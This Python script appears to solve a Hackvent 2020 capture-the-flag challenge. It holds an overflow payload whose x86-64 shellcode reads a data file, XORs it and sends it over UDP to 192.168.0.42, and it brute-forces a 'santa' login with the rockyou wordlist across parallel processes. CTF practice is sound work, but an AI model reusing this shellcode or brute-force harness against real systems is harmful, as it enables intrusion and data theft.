#!/usr/bin/env python3
from pwn import process, context
from os import system
from multiprocessing import Process
from numpy import array_split

context.log_level = 'error'

buff = [0x20, 0xe5, 0xaf, 0xe5, 0x9d, 0x31, 0xac, 0xa3, 0xca, 0x21, 0x1e, 0xc3, 0x79, 0xa6,
 0x73, 0x23, 0x5e, 0xda, 0xb6, 0xa0, 0x8d, 0x2e, 0xd3, 0xb7, 0xb6, 0x6b, 0x55, 0x85, 0x7e, 0xc8, 0x34, 0x22, 0x7a, 0x00, 0x00, 0x01, 0x00 , 0x01]

key = [0xde, 0xad, 0xbe, 0xef]

exploit = "\x33\x20\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" \
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" \
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" \
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" \
"\x41\x41\x10\x41\x40\x00\x00\x00\x00\x00\x68\x74\x78\x74\x00\x48" \
"\xbf\x74\x61\x5f\x64\x61\x74\x61\x2e\x57\x48\xbf\x64\x61\x74\x61" \
"\x2f\x73\x61\x6e\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02" \
"\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\xba\x00\x00\x01\x00\x01\x00" \
"\x00\x00\x52\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x48\x89\xe6\x48\xba" \
"\x01\x00\x00\x00\x00\x00\x00\x20\x52\x48\xba\x00\x00\x00\x13\x37" \
"\x01\x00\x00\x52\xba\x20\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05" \
"\x48\x31\xc9\x81\x34\x0e\xef\xbe\xad\xde\x48\x83\xc1\x04\x48\x83" \
"\xf9\x20\x75\xef\xbf\x02\x00\x00\x00\xbe\x02\x00\x00\x00\x48\x31" \
"\xd2\xb8\x29\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83" \
"\xc6\x03\xba\x32\x00\x00\x00\x41\xba\x00\x00\x00\x00\x6a\x00\x49" \
"\xb8\x02\x00\x00\x35\xc0\xa8\x00\x2a\x41\x50\x49\x89\xe0\x41\xb9" \
"\x10\x00\x00\x00\xb8\x2c\x00\x00\x00\x0f\x05\xbf\x00\x00\x00\x00" \
"\xb8\x3c\x00\x00\x00\x0f\x05\x0a"

with open('exploit.bin', 'w') as output_file:
    output_file.write(exploit)

for i in range(len(buff)):
    buff[i] ^= key[i % 4]

with open('./rockyou.txt', 'rb') as input_file:
    lines = input_file.readlines()

buff = [0x0a, 0x11, 0x48, 0x43, 0xde, 0x12, 0x0e, 0x14, 0xce, 0xa0, 0x6e, 0xa7, 0x49, 0xcd, 0x8e, 0x80, 0x35, 0x08,
 0x0d, 0x53, 0xc1, 0x6d, 0x1a, 0x68, 0x84, 0xeb, 0x28, 0xa0, 0x27, 0x8a, 0x8f, 0xa4]

with open('data/santa_data.txt', 'wb') as output_file:
    output_file.write(bytes(buff))

def brute_force_parts(lines, number):
    count = 0
    system(f"cp data/santa_data.txt {number}/data/santa_data.txt")

    for password in lines:
        count += 1
        try:
            password = password.strip().decode('utf-8')

            system(f"rm {number}/data/santa_pwd.txt 2>/dev/null")

            p = process(f'/home/manuel/Desktop/Hacking/hackvent-2020/24/{number}/data_storage', cwd=f'/home/manuel/Desktop/Hacking/hackvent-2020/24/{number}')
            p.recvuntil('username>')
            p.sendline('santa')
            p.recvuntil('password>')
            p.sendline(password)
            p.recvuntil('choice>')
            p.sendline("3")

            p = process(f'/home/manuel/Desktop/Hacking/hackvent-2020/24/{number}/data_storage', cwd=f'/home/manuel/Desktop/Hacking/hackvent-2020/24/{number}')
            p.recvuntil('username>')
            p.sendline('santa')
            p.recvuntil('password>')
            p.sendline(password)
            p.recvuntil('choice>')
            p.sendline("0")
            data = p.recvuntil('choice>')
            if b'HV20' in data:
                print(data)
                with open('flag.txt', 'wb') as output_file:
                    output_file.write(data)
                break
            p.sendline("3")
        except:
            pass
        
        if count % 1000 == 0:
            total = len(lines)
            print(f"{number} worker - {count} / {total} - {100 * count / total} %")


a, b, c, d = array_split(lines, 4)

p1 = Process(target=lambda: brute_force_parts(a, "1"))
p2 = Process(target=lambda: brute_force_parts(b, "2"))
p3 = Process(target=lambda: brute_force_parts(c, "3"))
p4 = Process(target=lambda: brute_force_parts(d, "4"))

p1.start()
p2.start()
p3.start()
p4.start()